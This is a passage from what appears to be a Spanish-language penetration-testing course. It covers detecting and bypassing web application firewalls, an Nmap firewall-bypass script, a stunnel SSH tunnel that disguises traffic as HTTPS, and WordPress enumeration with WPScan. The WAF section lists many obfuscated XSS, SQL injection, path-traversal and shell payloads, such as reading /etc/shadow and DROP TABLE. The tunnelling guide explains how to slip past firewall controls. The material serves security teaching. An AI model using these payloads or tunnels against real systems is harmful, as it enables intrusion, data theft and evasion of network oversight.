- Pruebe con cargas útiles XSS ruidosas como <script>confirm()</script> en algunos campos de entrada.
- Intente agregar ../../../etc/passwd a un parámetro aleatorio en la dirección URL.
- Agregue algunas cargas útiles como ' OR SLEEP(5) OR ' al final de las URL a cualquier parámetro aleatorio.
- Envíe solicitudes GET con protocolos obsoletos como HTTP/0.9 (HTTP/0.9 no admite consultas de tipo POST).
- Consulte el encabezado del servidor sobre diferentes tipos de interacciones.
- Envíe un paquete FIN&RST sin procesar al servidor e identifique una respuesta.
- Ataques de canal lateral: examine el comportamiento temporal del contenido de la solicitud y la respuesta.

## **Herramientas para verificar y omitir WAF:**

> w3af : marco de auditoría y ataque de aplicaciones web
> 
> 
> **[wafw00f](https://github.com/EnableSecurity/wafw00f)** — Identificar y tomar huellas dactilares del firewall de aplicaciones web
> 
> **[BypassWAF](https://github.com/vincentcox/bypass-firewalls-by-DNS-history) :** evita los firewalls abusando del historial de DNS. Esta herramienta buscará registros DNS A antiguos y comprobará si el servidor responde para ese dominio.
> 
> **[CloudFail](https://github.com/m0rtem/CloudFail)** : es una herramienta de reconocimiento táctico que intenta encontrar la dirección IP original detrás del WAF de Cloudflare.

## **Técnicas para evitar WAF:**

### **1. Técnica de alternancia de casos**

Combine caracteres en mayúsculas y minúsculas para crear cargas útiles eficientes.

**Solicitud básica:**

> <script>confirm()</script>

**Técnica omitida:**

> <ScrIpT>confirm()</sCRiPt>

**Solicitud básica:**

> SELECT * FROM * WHERE OWNER = 'NAME_OF_DB'

**Técnica omitida:**

> sELeCt * fRoM * wHerE OWNER = 'NAME_OF_DB'

**Ejemplo en URL:**

> http://example.com/index.php?page_id=-1 UnIoN SeLeCT 1,2,3,4

### **2. Técnica de codificación de URL**

> Codifique cargas útiles normales con % de codificación/codificación de URL. Puedes usar Burp Suite. Dispone de una herramienta codificadora/decodificadora.

**Bloqueado por WAF:**

> <Svg/x=">"/OnLoAD=confirm()//

**Técnica omitida:**

> %3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F

**Bloqueado por WAF:**

> UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)

**Técnica omitida:**

> UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29

**Ejemplo en URL:**

> https://example.com/page.php?id=1%252f%252a*/UNION%252f%252a /SELECT

### **3. Técnica Unicode**

Los caracteres ASCII en codificación Unicode nos brindan excelentes variantes para evitar WAF. Codifique toda o parte de la carga útil para obtener resultados.

**Solicitud básica:**

> <marquee onstart=prompt()>

**Ofuscado:**

> <marquee onstart=\u0070r\u06f\u006dpt()>

**Bloqueado por WAF:**

> /?redir=http://google.com

**Técnica omitida:**

> /?redir=http://google。com (Unicode alternative)

**Bloqueado por WAF:**

> <marquee loop=1 onfinish=alert()>x

**Técnica omitida:**

> ＜marquee loop＝1 onfinish＝alert︵1)>x (Unicode alternative)

**Solicitud básica:**

> ../../etc/shadow

**Ofuscado:**

> %C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow

### **4. Técnica de representación HTML**

Las aplicaciones web codifican caracteres especiales en HTML. Codificarlos y renderizarlos en consecuencia. Casos de bypass básicos con codificación HTML numérica y genérica.

**Solicitud básica:**

> "><img src=x onerror=confirm()>

**Carga útil codificada:**

> &quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;

**Carga útil codificada:**

> &#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;

### **5. Técnica de codificación mixta**

Estas reglas suelen tender a filtrar un tipo específico de codificación. Estos filtros pueden evitarse mediante cargas útiles de codificación mixta. Nuevas líneas y tabulaciones y se agregan más a la ofuscación.

**Ofuscar carga útil:**

> <A HREF="h
> 
> 
> tt p://6 6.000146.0x7.147/">XSS</A>
> 

### **6. Uso de la técnica de comentarios**

Los comentarios ofuscan los vectores de carga útil estándar. Diferentes cargas útiles tienen diferentes formas de ofuscarse.

**Bloqueado por WAF:**

> <script>confirm()</script>

**Técnica omitida:**

> <!--><script>confirm/**/()/**/</script>

**Bloqueado por WAF:**

> /?id=1+union+select+1,2--

**Técnica omitida:**

> /?id=1+un/**/ion+sel/**/ect+1,2--

Inserte comentarios en medio de las cadenas de ataque. Por ejemplo, /*!SELECT*/ puede ser pasado por alto por el WAF pero pasado a la aplicación de destino y procesado por una base de datos mysql.

**Ejemplo en URL:**

> index.php?page_id=-1 %55nION/**/%53ElecT 1,2,3,4
> 
> 
> 'union%a0select pass from users#
> 

**Ejemplo en URL:**

> index.php?page_id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3
> 

### **7. Técnica de doble codificación**

Los filtros de Web Application Firewall tienden a codificar caracteres para proteger la aplicación web. Los filtros mal desarrollados (sin filtros de recursividad) se pueden omitir con doble codificación.

**Solicitud básica:**

> http://example/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\

**Ofuscar carga útil:**

> http://example/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\

**Solicitud básica:**

> <script>confirm()</script>

**Ofuscar carga útil:**

> %253Cscript%253Econfirm()%253C%252Fscript%253E

### **8. Técnica de ofuscación con comodines**

Varias utilidades de línea de comandos utilizan patrones globales para trabajar con varios archivos. Podemos cambiarlos para ejecutar comandos del sistema.

**Solicitud básica:**

> /bin/cat /etc/passwd

**Ofuscar carga útil:**

> /???/??t /???/??ss??

**Caracteres usados:**

> / ? t s

**Solicitud básica:**

> /bin/nc 127.0.0.1 443

**Ofuscar carga útil:**

> /???/n? 2130706433 443

**Caracteres usados:**

> / ? n [0-9]

### **9. Técnica de generación de carga útil dinámica:**

Los lenguajes de programación tienen diferentes patrones y sintaxis para la concatenación. Esto nos permite generar cargas útiles que pueden eludir muchos filtros y reglas.

**Solicitud básica:**

> <script>confirm()</script>

**Ofuscar carga útil:**

> <script>eval('con'+'fi'+'rm()')</script>

**Solicitud básica:**

> /bin/cat /etc/shadow

**Ofuscar carga útil:**

> /bi'n'''/c''at' /e'tc'/sh''ad'ow

Bash permite la concatenación de rutas para su ejecución.

**Solicitud básica:**

> <iframe/onload='this["src"]="javascript:confirm()"';>

**Ofuscar carga útil**

> <iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:con"+"fir"+"m()"';>

### **10. Técnica de personajes basura**

WAF filtra fácilmente las cargas útiles simples. Agregar algunos caracteres basura ayuda a evitar la detección (solo en casos específicos). Esta técnica a menudo ayuda a confundir los firewalls basados ​​en expresiones regulares.

**Solicitud básica:**

> <script>confirm()</script>

**Ofuscar carga útil:**

> <script>+-+-1-+-+confirm()</script>

**Solicitud básica:**

> <BODY onload=confirm()>

**Ofuscar carga útil:**

> <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>

**Solicitud básica:**

> <a href=javascript;alert()>ClickMe

**Técnica omitida:**

> <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe

### **11. Técnica de saltos de línea**

Muchos WAF con filtrado basado en expresiones regulares bloquean eficazmente muchos intentos. La técnica de saltos de línea (CR y LF) puede romper la expresión regular del firewall y omitir cosas.

**Solicitud básica:**

> <iframe src=javascript:confirm(hacker)">

**Ofuscar carga útil:**

> <iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(hacker)">

### **12. Técnica de variables no inicializadas**

Los filtros basados ​​en expresiones regulares incorrectos se pueden evadir con variables bash no inicializadas. Dicho valor es igual a nulo y actúa como cadenas vacías. Bash y Perl permiten este tipo de interpretaciones.

Ofuscación de primer nivel: normal

**Solicitud básica:**

> /bin/cat /etc/shadow

**Ofuscar carga útil:**

> /bin/cat$u /etc/shadow$u

Ofuscación de segundo nivel: basada en la posición

**Solicitud básica:**

> /bin/cat /etc/shadow

**Ofuscar carga útil:**

> $u/bin$u/cat$u $u/etc$u/shadow$u

Ofuscación de tercer nivel: caracteres aleatorios

**Solicitud básica:**

> /bin/cat /etc/passwd

**Ofuscar carga útil:**

> $aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff

### **13. Técnica de tabulaciones y avances de línea**

Las pestañas a menudo ayudan a evadir los firewalls, especialmente los basados ​​en expresiones regulares. Las pestañas pueden ayudar a romper la expresión regular WAF cuando la expresión regular espera espacios en blanco y no pestañas.

**Solicitud básica:**

> <IMG SRC="javascript:confirm();">

**Técnica omitida:**

> <IMG SRC=" javascript:confirm();">

**Variante:**

> <IMG SRC=" jav ascri pt:confirm ();">

**Solicitud básica:**

> http://test.com/test?id=1 union select 1,2,3

**Técnica omitida** :

> http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3

**Solicitud básica:**

> <iframe src=javascript:confirm()></iframe>

**Ofuscar carga útil:**

> <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:c&Tab;o&Tab;n&Tab;f&Tab;i&Tab;r&Tab;m&Tab;%28&Tab;%29></iframe>

### 14. Técnica para romper fichas

Los ataques a tokens intentan romper la lógica de dividir una solicitud en tokens con disyuntores de tokens. Los token-breakers son símbolos que permiten afectar la correspondencia entre un elemento de una cadena y un determinado token. Nuestra solicitud debe seguir siendo válida mientras utilizamos rompedores de tokens.

Estudio de caso: token desconocido para el "tokenizador"

**Nuestra carga útil:**

> ?id=‘-sqlite_version() UNION SELECT passwords FROM users --

Estudio de caso: contexto desconocido para el analizador (observe el corchete sin contexto)

**Primera carga útil:**

> ?id=12);DROP TABLE users --

**Segunda carga útil:**

> ?id=133) INTO OUTFILE ‘xxx’ --

### 15. Técnica de ofuscación en otros formatos.

Muchas aplicaciones web admiten diferentes tipos de codificación y pueden interpretar la codificación. Siempre necesitamos ofuscar la carga útil a un formato que no sea compatible con WAF, pero el servidor puede pasar de contrabando nuestra carga útil.

Caso IIS:

IIS 6, 7.5, 8 y 10 permiten interpretaciones de caracteres IBM037. Envíe los parámetros codificados con la consulta.

**Solicitud original:**

> POST /example.aspx?id7=sometext HTTP/1.1
> 
> 
> HOST: target.org
> 
> Content-Type: application/x-www-form-urlencoded; charset=utf-8
> 
> Content-Length: 27
> 
> id2='union all select * from users--

**Solicitud ofuscada con codificación de URL:**

> POST /example.aspx?%89%84%F7=%A2%95%94%86%A3%88%89%95%87 HTTP/1.1
> 
> 
> HOST: target.org
> 
> Content-Type: application/x-www-form-urlencoded; charset=ibm037
> 
> Content-Length: 127
> 
> %89%84%F2=%7D%A4%95%89%97%95%40%81%93%94%40%A2%85%93%85%84%A3%40%5C%40%86%99%97%94%40%A4%A2%85%99%A2%60%60

## **NMAP - Script firewall-bypass**

Detecta una vulnerabilidad en netfilter y otros firewalls que utilizan ayudas para abrir dinámicamente puertos para protocolos como ftp y sip. El script funciona falsificando un paquete del servidor de destino solicitando abrir una conexión relacionada a un puerto de destino que será cumplida por el firewall a través del puerto auxiliar de protocolo adecuado. Para que esto funcione, la máquina atacante debe estar en el mismo segmento de red que el firewall. El script admite el asistente ftp tanto en IPv4 como en IPv6. El filtro de ruta real se utiliza para prevenir este tipo de ataques.

Descarga:  [**https://svn.nmap.org/nmap/scripts/firewall-bypass.nse**](https://svn.nmap.org/nmap/scripts/firewall-bypass.nse)

Para más información, ver:

- **[http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/](http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/)**

**Argumentos**

> firewall-bypass.helper
> 
> 
> El ayudante a utilizar. El valor predeterminado es ftp. Ayudantes compatibles: ftp (tanto IPv4 como IPv6).
> 
> **firewall-bypass.targetport**
> 
> Puerto para probar la vulnerabilidad. El puerto de destino debe ser un puerto no abierto. Si no se proporciona, el script intentará encontrar un puerto filtrado o cerrado a partir de los resultados del escaneo de puertos.
> 
> **firewall-bypass.helperport**
> 
> Si no utiliza el puerto predeterminado del asistente.
> 

**Ejemplos**

> nmap --script firewall-bypass <objetivo>
> 
> 
> nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp", firewall-bypass.targetport=22 <destino>
> 

**Salida**

> Resultados del script del host:
> 
> 
> | omisión de firewall:
> 
> |_ Firewall vulnerable a omisión a través del asistente ftp. (IPv4)
> 

**Cómo evitar los firewalls ocultando todo el tráfico en el tráfico encapsulado HTTPS(SSL)443**

Por lo general, cuando se está detrás de un firewall público o bloqueado, la mayoría del tráfico de salida (saliente) permitido es el puerto 80(http) y 443(https). Esto es para permitir sólo la navegación web y evitar el uso de otras aplicaciones y servicios como el correo electrónico o los juegos. El tráfico web saliente también se puede restringir mediante el filtrado de contenido, permitiendo a qué tipo de sitios web se puede acceder. Otra gran preocupación es la privacidad. Cuando utiliza redes públicas o incluso utiliza la red de su propio ISP, todo su tráfico es visible para ellos.

Con esta configuración de proxy inverso podemos enmascarar todo nuestro tráfico para que aparezca esencialmente como tráfico HTTPS, lo que nos permite evitar muchas de estas restricciones. Esto también se puede utilizar como alternativa a las VPN o junto con VPN para enmascarar aún más el tráfico y proporcionar más privacidad. Este método funcionará en la mayoría de las situaciones. A veces, se configura la inspección SSL o se aprovecha el filtrado de contenido avanzado y/o la inteligencia sobre amenazas, lo que aumenta los factores de bloqueo del tráfico. Sin embargo, estos escenarios normalmente sólo ocurren en entornos corporativos maduros y no en las redes públicas promedio.

Alojaremos un proxy inverso en Internet. Con una herramienta llamada stunnel podemos crear un túnel de reenvío de puertos cifrados a través de una conexión 443 (HTTPS). Luego usaremos ese reenvío de puerto para crear un túnel ssh oculto dentro del tráfico 443(ssl) cifrado que nos permitirá configurar un proxy de sockets anidado O un reenvío de puerto que a su vez nos permitirá enviar cualquier tráfico que queramos fuera de la red.

![firewall-bypass](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/firewall-bypass.png?raw=true)

### **Requisitos**

Para esta implementación usaré un VPS (servidor privado virtual) Ubuntu 23.04 para el servidor proxy inverso y Kali 6.3.0 para la máquina cliente . Esta configuración no requiere estos sistemas operativos específicamente. Si decide utilizar diferentes sistemas operativos, asegúrese de que las herramientas sean compatibles.

Servidor proxy inverso:

- [LetsEncrypt (servicio de certificado SSL gratuito)](https://letsencrypt.org/docs/faq/)
- Dominio comprado para crear un certificado SSL válido (puede ser un dominio económico, es decir, $1,99/año)

Herramientas/Servicios

- [apache2](https://httpd.apache.org/)
- [certbot](https://certbot.eff.org/)
- [stunnel(server mode)](https://www.stunnel.org/)

Máquina cliente:

Herramientas

- [stunnel (modo cliente)](https://www.stunnel.org/)

### **Configuración**

Servidor Proxy inverso

El servidor requerirá el mayor esfuerzo de configuración. Como se trata de una nueva instalación de Ubuntu, actualizaremos y actualizaremos el servidor.

> sudo apt update && sudo apt upgrade -y

Ahora necesitamos instalar el servicio apache2 y luego ejecutar certbot para recibir nuestro certificado SSL de LetsEncrypt. Esto nos permite recibir un certificado SSL firmado relacionado con nuestro dominio para el servidor proxy inverso.

**Instalar Apache2**

> sudo apt update
> 
> 
> sudo apt install apache2
> 

Teniendo en cuenta que el servidor ejecuta servicios y es accesible desde Internet, crearemos reglas de firewall basadas en host.

Crear reglas de firewall basadas en host

> sudo ufw allow 22/tcp
> 
> 
> sudo ufw allow 80/tcp
> 
> sudo ufw allow 443/tcp

No dude en agregar más reglas de firewall que sean necesarias para cualquier otro servicio que decida ejecutar. Ahora que se crearon las reglas, debemos habilitarlas.

Habilitar reglas de firewall

> sudo ufw reload

Habilitar el servicio Apache2

> sudo systemctl start apache2

Ahora, como se explica en el sitio web de certbot, utilizaremos el servicio apache2 para solicitar nuestro certificado SSL firmado para el dominio comprado. Si aún no posee uno, este es el momento de comprar un dominio antes de continuar. El dominio que adquirimos es importante porque aquí es hacia1 donde se verá todo nuestro tráfico tunelizado cuando pase a través de la red y el firewall. Elija un nombre de dominio genérico o inocente con un dominio de nivel superior común como .com, .net, .io, etc. (Se sabe que los firewalls con inteligencia de amenazas bloquean dominios baratos o poco comunes como .xyz)

El registrador suele proporcionar servicios DNS que utilizará para el dominio que compró. Una vez que haya creado un registro DNS A y apunte a su servidor proxy inverso, estará listo para recibir su certificado SSL utilizando certbot. Certbot es un script que automatiza la creación de certificados SSL con LetsEncrypt. Para ver instrucciones específicas, que pueden variar según el sistema operativo de su servidor proxy inverso, [visite aquí](https://certbot.eff.org/instructions)

**Instalar Certbot**

> sudo snap install --classic certbot
> 
> 
> sudo ln -s /snap/bin/certbot /usr/bin/certbot

Antes de ejecutar cerbot, editaremos el archivo de configuración /etc/apache2/sites-available/000-default.conf para que el script cerbot pueda identificar nuestro servidor por el nombre de dominio adquirido.

Editar el archivo de configuración de Apache2

> sudo vim /etc/apache2/sites-available/000-default.conf

Agregue la siguiente línea al archivo de configuración.

> ServerName yourdomain.net

![yourdomain.net](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net.png?raw=true)

Ahora es el momento de recibir nuestro certificado SSL y comenzar la configuración de Stunnel.

Ejecutar certbot

> sudo snap install --classic certbot

Una vez que esto se ejecute correctamente, debería ver el resultado de dónde se encuentran su nuevo certificado SSL y clave privada.

> cert = /etc/letsencrypt/live/yourdomain.net/fullchain.pem
> 
> 
> key = /etc/letsencrypt/live/yourdomain.net/privkey.pem

Ya no necesitamos el servicio apache2 ahora que hemos usado certbot para obtener nuestro certificado SSL válido. El servicio debe detenerse para que stunnel pueda utilizar más tarde el puerto de escucha 443.

Detener el servicio Apache2

> sudo systemctl stop apache2

Ahora se puede configurar Stunnel. Instálelo en el servidor proxy inverso.

Instalar Stunnel

> sudo apt update
> 
> 
> sudo apt install stunnel4

Cree/edite el archivo de configuración de stunnel en el servidor para usar nuestro nuevo certificado SSL. Definiremos su puerto de escucha e instrucciones de reenvío.

> sudo vim /etc/stunnel/stunnel.conf

Agregue las siguientes líneas al archivo de configuración

> pid = /var/run/stunnel.pid
> 
> 
> cert = /etc/letsencrypt/live/yourdomain.net/fullchain.pem
> 
> key = /etc/letsencrypt/live/yourdomain.net/privkey.pem
> 
> [ssh]
> 
> accept = 0.0.0.0:443
> 
> connect = localhost:22

![yourdomain.net1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net1.png?raw=true)

Edite el archivo de configuración adicional de stunnel para habilitar el servicio

> sudo vim /etc/default/stunnel4

Agregue la siguiente línea al final del archivo de configuración

> ENABLED=1

![yourdomain.net2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net2.png?raw=true)

Iniciar el servicio de túnel

> sudo /etc/init.d/stunnel4 restart 

Para asegurarse de que el servicio stunnel se esté ejecutando y escuchando en el puerto 443 especificado, ejecute el siguiente comando

> sudo netstat -ano | grep tcp

![yourdomain.net3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net3.png?raw=true)

Si ve que su servidor proxy inverso está escuchando en el puerto 443 después de iniciar el servicio stunnel, ¡ya está todo listo! Ahora pasemos a la máquina cliente, configuremos el cliente stunnel y comencemos a omitirlo.

### Máquina cliente

Actualice y actualice la nueva instalación de Kali en la máquina cliente.

> sudo apt update && sudo apt upgrade -y

Ahora que nuestra máquina cliente está actualizada y lista para funcionar, necesitamos instalar stunnel.

**Instalar Stunnel**

> sudo apt install stunnel4

Cree un archivo de configuración para el cliente stunnel. Esto se puede crear en cualquier lugar, pero yo crearé el mío en el directorio $HOME.

Crear archivo de configuración

> vim $HOME/stunnel-client.conf

Agregue las siguientes líneas al archivo de configuración

> pid = /tmp/stunnel.pid
> 
> 
> client=yes
> 
> [ssh]
> 
> accept=9443
> 
> connect=yourdomain.net:443

![Maquina Cliente1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente1.png?raw=true)

Ejecute el cliente stunnel para conectarse al servidor proxy inverso estableciendo el túnel ssl(443)

> sudo stunnel $HOME/stunnel-client.conf

Ahora confirme si el cliente está escuchando en su puerto de reenvío definido en el archivo de configuración.

> sudo netstat -ano | grep tcp

![Maquina Cliente2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente2.png?raw=true)

**Evitando**

El servidor proxy inverso está completamente instalado y configurado. Podemos conectarnos exitosamente desde nuestra máquina cliente usando stunnel para crear el túnel ssl(443). Ahora configuraremos nuestro puerto SSH forward o proxy de sockets  que estará oculto dentro de nuestro túnel ssl(443).

sockets SSH 4/5 Proxy

Este túnel SSH abrirá un proxy de sockets  en la máquina cliente que reenviará cualquier tráfico que se le envíe a través del túnel ssh que está oculto dentro del túnel ssl(443).

Crear el túnel proxy ssh sock

> sudo ssh -D 9090 -q -C -N <user>@127.0.0.1 -p 9443
> 
> - D : specifies the listening port of the socks proxy on the client
> - q : runs quiet mode where no output is displayed locally
> - C : compress data in the tunnel to save bandwidth
> - N : non interactive ssh session just creats the tunnel no command prompt
> - p : defines the destination port to connect to (We are conencting to port forward provided by stunnel client)

![Maquina Cliente3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente3.png?raw=true)

Reenvío de puerto SSH

Este túnel SSH creará un puerto de escucha en la máquina cliente para reenviar el tráfico a través del túnel ssh que está oculto dentro del túnel ssl(443).

Crear el túnel de reenvío de puertos ssh

> sudo ssh -q -C -N -L 9090:<destination ip>:<destination port> <user>@127.0.0.1 -p 9443

> -L : specifies the listening port of the port forward on the client
> 
> - q : runs quiet mode where no output is displayed locally
> - C : compress data in the tunnel to save bandwidth
> - N : non interactive ssh session just creats the tunnel no command prompt
> - p : defines the destination port to connect to (We are conencting to port forward provided by stunnel client)

![Maquina Cliente4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente4.png?raw=true)

## **Conclusión**

Con esta configuración y técnica del servidor proxy inverso podemos hacer que todo el tráfico O específico aparezca como HTTPS(443). Una vez que el cliente establece su túnel SSL con el servidor proxy inverso, el firewall no puede distinguir entre nuestro túnel SSL y el tráfico HTTPS(443) normal debido al cifrado. En las redes públicas en general, esto es suficiente para evitar las restricciones del firewall. Esto también funciona como alternativa de VPN en redes donde el tráfico VPN está bloqueado. Recuerde que sólo el tráfico TCP puede atravesar el proxy ssh Socks o el reenvío de puertos.

Cuando se trata de firewalls avanzados, existen muchos factores adicionales que pueden determinar si la conexión SSL está permitida a través del puerto 443. Los firewalls más avanzados no solo pueden realizar inspección SSL (descifrado), sino que también pueden tomar decisiones para permitir el tráfico según la dirección IP geográfica de destino. ubicación, atributos del certificado SSL, categorización del dominio y reputación del dominio. Aquí es donde es crucial elegir un dominio con un TLD (dominio de nivel superior) común y un país generalmente confiable para alojar el servidor proxy inverso.

<aside>
👉 Se recomendaría registrar un dominio caducado que ya tenga categorización de URL y buena reputación. Si ha comprado un dominio nuevo, hay formas de clasificarlo y crear una reputación de dominio. Estos no se tratarán aquí, pero se abordarán en otro blog. Si llegó hasta aquí, espero que haya sido útil y estoy seguro de que se le ocurrirán algunos casos de uso creativos para esta configuración.
</aside>

Es fundamental comprender primero cómo funciona un firewall antes de intentar hackearlo. Un firewall realiza un seguimiento de todo el tráfico de la red, tanto entrante como saliente, y, según las reglas que se hayan configurado, permite o prohíbe que ese tráfico llegue a su destino. El hecho de que los firewalls sean frecuentemente la línea inicial de defensa en una red los convierte en un ejemplo de seguridad perimetral.

Resumamos todo lo escrito anteriormente. Piense siempre fuera de lo común. Pruebe diferentes técnicas de codificación y algunas funcionarán. No seas perezoso en comprobar los registros DNS. No olvide que se puede eludir cualquier protección en los recursos web y que WAF no es una panacea para todos los problemas. Los hackers no duermen y siempre buscan nuevas técnicas para atacar tus recursos y obtener beneficios. Las pruebas de penetración periódicas le ayudarán a evitar muchos problemas.

# Enumeración y explotación de vulnerabilidades

## **Enumeración web con WPScan**

WPScan se lanzó por primera vez en 2011, ha sobrevivido al tiempo y se destacó como una herramienta vital que todo pentester debería tener en su caja de herramientas.

WPScan es capaz de enumerar e investigar algunas categorías de vulnerabilidades de seguridad presentes en los sitios de WordPress como:

- Divulgación de información confidencial (versiones de instalación de complementos y temas para vulnerabilidades reveladas o CVE)
- Descubrimiento de ruta (buscando permisos de archivos mal configurados)
- Políticas de contraseñas débiles (fuerza bruta de contraseñas)
- Presencia de instalación predeterminada (buscando archivos predeterminados)
- Prueba de firewalls de aplicaciones web (complementos WAF comunes)

### **Instalación:**

Afortunadamente, WPScan viene preinstalado en la última versión de Kali Linux y Parrot OS. Si está utilizando una versión anterior de Kali, simplemente puede instalarla desde el siguiente comando en su terminal.

> sudo apt update && sudo apt install wpscan

![WPScan1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan1.png?raw=true)

Si está utilizando diferentes sistemas operativos y otras distribuciones, puede consultar la documentación del [desarrollador](https://github.com/wpscanteam/wpscan#install) y aprender cómo instalarlo en su máquina.

**Base de datos de WPScan:**

WPScan utiliza información dentro de una base de datos local como punto de referencia principal al enumerar temas y complementos. Antes de utilizar WPScan, se recomienda encarecidamente que actualice esta base de datos antes de realizar cualquier análisis.

Para actualizar su base de datos wpscan, simplemente ejecute este comando en su terminal

> wpscan --update

![WPScan2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan2.png?raw=true)

### **Enumeración de temas:**

WPS puede tener algunas formas de determinar el tema instalado en el sitio. Básicamente, primero utiliza una técnica que también podemos hacer manualmente. Simplemente podemos mirar los activos de las cargas del navegador web y luego buscar la ubicación del tema instalado en el servidor web. Usando la pestaña "Red" en su navegador web, puede ver qué archivos se cargan cuando visita ese sitio.

![WPScan3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan3.png?raw=true)

Arriba podemos ver una captura de pantalla donde se han cargado muchos archivos y mientras los revisaba encontré esta URL

[http://www.anywordpressintalledsite.com/wp-content/themes/twentynineteen](http://www.anywordpressintalledsite.com/wp-content/themes/twentynineteen)

Al mirar esta URL podemos estar seguros de que el tema instalado es twentynineteen. Ahora automaticemos nuestro trabajo, usemos nuestro wpscan para descubrir qué tema exacto se está ejecutando escribiendo el siguiente comando

> wpscan --url http://www.anywordpressintalledsite.com/ --enumerate t
> 

y aquí esta el resultado:

![WPScan4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan4.png?raw=true)

Lo mejor de  wpscan es que le dice cómo descubrió ese resultado.

![WPScan5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan5.png?raw=true)

### **Enumeración de complementos:**

una característica muy común del servidor web es la lista de directorios, es como el comando **ls** en Linux. Enumera los archivos y directorios enumerados en ese servidor web. El “Listado de directorios” ocurre cuando no hay ningún archivo presente que se le haya indicado al servidor web que procese. Un archivo muy común es “index.html” e “index.php”. Como estos archivos no están presentes en el directorio /a/, se muestran los contenidos:

![WPScan6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan6.png?raw=true)

wpscan puede aprovechar esta función para averiguar qué complementos están instalados. Dado que todos estarán ubicados en /wp-content/plugins/pluginname, WPScan puede enumerar complementos comunes/conocidos. Podemos usar el siguiente comando para enumerar complementos.

> wpscan --url http://www.anywordpressintalledsite.com/ --enumerate p
> 

Al leer la documentación para desarrolladores de WordPress, podemos aprender sobre el "[read me](https://developer.wordpress.org/plugins/wordpress-org/how-your-readme-txt-works/#how-the-readme-is-parsed)" para descubrir cómo WPScan determinó el número de versión. Simplemente, los complementos deben tener un archivo “README.txt”. Este archivo contiene metainformación como el nombre del complemento, las versiones de WordPress con las que es compatible y una descripción.

![WPScan7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan7.png?raw=true)

### **Enumeración de usuarios:**

Después de leer todo esto, creo que se dará cuenta de lo poderosa que es esta herramienta. Entonces, si te digo que también podemos enumerar usuarios usando esta herramienta, no te sorprenderá. La forma en que WPScan enumera a los usuarios es interesantemente simple. Los sitios de WordPress utilizan autores para las publicaciones. Los autores son de hecho un tipo de usuario.

![WPScan8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan8.png?raw=true)

Usemos nuestro wpscan para escanear a los usuarios y ¿cómo podemos hacerlo exactamente? simple siguiendo el comando dado

> wpscan --url http://www.anywordpressintalledsite.com/ --enumerate u

![WPScan9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan9.png?raw=true)

Arriba podemos ver que encontró al usuario pero dice algo de fuerza bruta. sí, también puede hacer eso. wpscan puede aplicar fuerza bruta usando una lista mundial. ¿Después de eso dice error de inicio de sesión? sí, intentó iniciar sesión con ese nombre de usuario y descubrió que el usuario es real.

![WPSca10](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan10.png?raw=true)

**La bandera "Vulnerable":**

hasta ahora solo hemos enumerado temas, complementos y usuarios y luego visitaremos sitios como MITRE, NVD y CVEDetails para buscar los nombres de estos complementos y los números de versión para determinar cualquier vulnerabilidad. Lo cual lleva bastante tiempo y es aburrido. Es por eso que wpscan tiene un indicador específico para hacer nuestro trabajo y ese indicador es -v. Para comprobar si algún complemento instalado es vulnerable o no, podemos escribir este comando y averiguarlo.

> wpscan --url http://www.anywordpressintalledsite.com/ --enumerate vp

Arriba dije -v flag pero escribí vp. ¿Cometí un error? No, esa p significa complemento para que pueda indicarle a wpscan que verifique los complementos si son vulnerables o no.

![WPSca11](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wpscan11.png?raw=true)

Obtuvimos nuestros resultados en solo unos segundos y descubrimos que los complementos no son vulnerables.

### **Ataque de contraseña:**

